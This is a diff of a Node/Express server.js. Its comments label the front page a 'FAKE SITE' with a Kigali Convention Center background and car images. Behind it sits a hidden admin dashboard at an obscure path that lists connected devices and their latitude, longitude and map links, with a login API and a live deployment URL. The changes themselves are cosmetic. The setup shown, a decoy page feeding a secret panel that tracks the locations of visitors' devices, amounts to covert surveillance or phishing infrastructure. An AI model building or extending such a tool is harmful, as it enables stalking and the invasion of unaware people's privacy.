@@ -1,4 +1,4 @@
-// server.js – FULL VERSION with Kigali Convention Center + Luxury Cars
+// server.js – FULL VERSION with Kigali Convention Center Background
 const express = require('express');
 const crypto = require('crypto');
 const app = express();
@@ -22,7 +22,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ============================================================
-// FAKE SITE – Kigali Convention Center + Luxury Cars
+// FAKE SITE – Kigali Convention Center Background
 // ============================================================
 app.get('/', (req, res) => {
     res.send(`
@@ -60,28 +60,9 @@ app.get('/', (req, res) => {
                     width: 100%;
                     height: 100%;
                     background: 
-                        linear-gradient(135deg, rgba(10,14,23,0.85) 0%, rgba(10,14,23,0.4) 100%),
-                        url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600"%3E%3Crect fill="%23111927" width="800" height="600"/%3E%3Ccircle cx="200" cy="300" r="250" fill="%234fc3f7" opacity="0.03"/%3E%3Ccircle cx="600" cy="200" r="180" fill="%234fc3f7" opacity="0.02"/%3E%3C/svg%3E') center/cover;
+                        linear-gradient(135deg, rgba(10,14,23,0.7) 0%, rgba(10,14,23,0.3) 100%),
+                        url('/public/images/kigali-convention-center.png') center/cover no-repeat;
                     z-index: 0;
-                }
-
-                .building-silhouette {
-                    position: absolute;
-                    bottom: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 45%;
-                    z-index: 0;
-                    opacity: 0.15;
-                    background: 
-                        radial-gradient(ellipse 40% 60% at 50% 100%, #4fc3f7 0%, transparent 70%),
-                        linear-gradient(0deg, transparent 40%, #4fc3f7 40%, #4fc3f7 42%, transparent 42%),
-                        linear-gradient(0deg, transparent 40%, #4fc3f7 40%, #4fc3f7 42%, transparent 42%),
-                        linear-gradient(0deg, transparent 30%, #4fc3f7 30%, #4fc3f7 32%, transparent 32%),
-                        linear-gradient(0deg, #4fc3f7 0%, #4fc3f7 5%, transparent 5%);
-                    background-size: 100% 100%, 30% 100%, 30% 100%, 100% 100%, 100% 100%;
-                    background-position: center, 10% bottom, 90% bottom, center bottom, center bottom;
-                    background-repeat: no-repeat, no-repeat, no-repeat, no-repeat, no-repeat;
                 }
 
                 .car-container {
@@ -92,7 +73,7 @@ app.get('/', (req, res) => {
                     display: flex;
                     justify-content: space-around;
                     padding: 0 20px;
-                    opacity: 0.2;
+                    opacity: 0.25;
                 }
                 .car {
                     display: inline-block;
@@ -223,7 +204,6 @@ app.get('/', (req, res) => {
 
         <section class="hero">
             <div class="hero-bg"></div>
-            <div class="building-silhouette"></div>
 
             <div class="car-container">
                 <span class="car">🏎️</span>
@@ -266,11 +246,9 @@ app.get('/', (req, res) => {
 });
 
 // ============================================================
-// ADMIN DASHBOARD (full HTML – concatenated to avoid backtick issues)
+// ADMIN DASHBOARD (full HTML – concatenated)
 // ============================================================
 app.get('/a9f3k217', (req, res) => {
-    // ... (keep your existing dashboard HTML here – the one we built earlier)
-    // I'll include the full dashboard HTML below for completeness
     let html = '';
     html += '<!DOCTYPE html>\n';
     html += '<html>\n';
@@ -382,7 +360,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '          <div class="coord"><strong>Longitude:</strong> <span id="lngValue">--</span></div>\n';
     html += '          <div class="coord"><strong>Accuracy:</strong> <span id="accValue">--</span></div>\n';
     html += '          <div class="coord"><strong>Last Updated:</strong> <span id="locTime">--</span></div>\n';
-    html += '          <a href="#" id="mapLink" class="map-link" target="_blank" style="display:none;">Open in Google Maps →</a>\n';
+        html += '          <a href="#" id="mapLink" class="map-link" target="_blank" style="display:none;">Open in Google Maps →</a>\n';
     html += '          <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>\n';
     html += '        </div>\n';
     html += '      </div>\n';
@@ -540,7 +518,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    renderDevices(devices);\n';
     html += '  } catch (error) { console.error("Error loading data:", error); }\n';
     html += '}\n';
-    html += 'function renderDevices(devices) {\n';
+     html += 'function renderDevices(devices) {\n';
     html += '  const container = document.getElementById("devicesList");\n';
     html += '  if (!devices || devices.length === 0) {\n';
     html += '    container.innerHTML = "<div class=\\"empty\\"><div class=\\"icon\\">📱</div>No devices connected yet</div>";\n';
@@ -583,7 +561,9 @@ app.get('/a9f3k217', (req, res) => {
     html += '</html>';
 
     res.send(html);
-});// ============================================================
+});
+
+// ============================================================
 // LOGIN API
 // ============================================================
 app.post('/a9f3k217/api/login', (req, res) => {
@@ -713,4 +693,3 @@ app.listen(PORT, () => {
     console.log(`✅ Dashboard running on port ${PORT}`);
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
 });
-        
